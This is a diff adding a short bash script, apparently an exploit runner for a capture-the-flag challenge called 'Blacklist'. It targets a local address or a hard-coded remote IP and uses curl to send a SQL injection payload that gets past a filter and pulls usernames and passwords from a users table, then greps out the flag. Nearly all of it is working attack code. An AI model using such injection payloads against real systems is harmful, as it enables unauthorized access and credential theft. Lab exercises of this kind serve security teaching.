@@ -1,0 +1,18 @@
+#!/bin/bash
+PORT=13000
+
+if [[ $1 == "local" ]]
+then
+    url='http://127.0.0.1:'$PORT
+elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
+then
+    url='http://141.85.224.118:'$PORT
+else
+    url=$1':'$2
+fi
+
+# Blacklist
+echo "Start exploit for Blacklist"
+flag=$(curl -s -G --data-urlencode 'q=and 0 union select 1,username,password from users #\' $url | grep -m 1 -o "SSS{.*}")
+echo "Flag is $flag"
+echo "----------------------------"
